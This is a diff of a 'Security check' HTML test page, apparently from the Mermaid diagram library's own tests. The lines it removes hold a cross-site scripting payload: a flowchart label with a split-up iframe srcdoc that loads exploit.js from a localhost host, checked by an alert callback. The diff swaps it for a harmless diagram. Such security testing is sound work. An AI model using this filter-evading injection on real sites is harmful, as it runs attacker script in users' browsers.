@@ -41,7 +41,10 @@
   <body>
     <div>Security check</div>
     <div class="flex">
-      <div id="diagram" class="mermaid"></div>
+      <div id="diagram" class="mermaid">
+sequenceDiagram
+  Nothing:Valid;
+      </div>
       <div id="res" class=""></div>
   <script src="./mermaid.js"></script>
     <script>
@@ -49,28 +52,6 @@
         // console.error('Mermaid error: ', err);
       };
       mermaid.initialize({
-        theme: 'forest',
-        arrowMarkerAbsolute: true,
-        // themeCSS: '.edgePath .path {stroke: red;} .arrowheadPath {fill: red;}',
-        logLevel: 0,
-        state: {
-          defaultRenderer: 'dagre-wrapper',
-        },
-        flowchart: {
-          // defaultRenderer: 'dagre-wrapper',
-          nodeSpacing: 10,
-    curve: 'cardinal',
-    htmlLabels: true,
-        },
-        htmlLabels: false,
-        // gantt: { axisFormat: '%m/%d/%Y' },
-        sequence: { actorFontFamily: 'courier', actorMargin: 50, showSequenceNumbers: false },
-        // sequenceDiagram: { actorMargin: 300 } // deprecated
-        // fontFamily: '"times", sans-serif',
-        // fontFamily: 'courier',
-        fontSize: 18,
-        curve: 'basis',
-        securityLevel: 'strict',
         startOnLoad: false,
         // themeVariables: {relationLabelColor: 'red'}
       });
@@ -78,19 +59,12 @@
   alert('It worked');
 }
 
-      var diagram = '%%{init: {"flowchart": {"htmlLabels": "false"}} }%%\n';
-diagram += 'flowchart\n';
-diagram += 'A["<ifra';
-diagram += "me srcdoc='<scrip";
-diagram += 't src=http://localhost:9000/exploit.js>';
-diagram += '</scr';
-diagram += 'ipt>\'></iframe>"]';
-
-console.log(diagram);
 // document.querySelector('#diagram').innerHTML = diagram;
-mermaid.render('diagram', diagram, (res) => {
-  document.querySelector('#res').innerHTML = res;
-});
+try {
+  mermaid.initThrowsErrors(undefined, '#diagram');
+} catch (err) {
+  console.log('Caught error:', err);
+}
     </script>
   </body>
 </html>
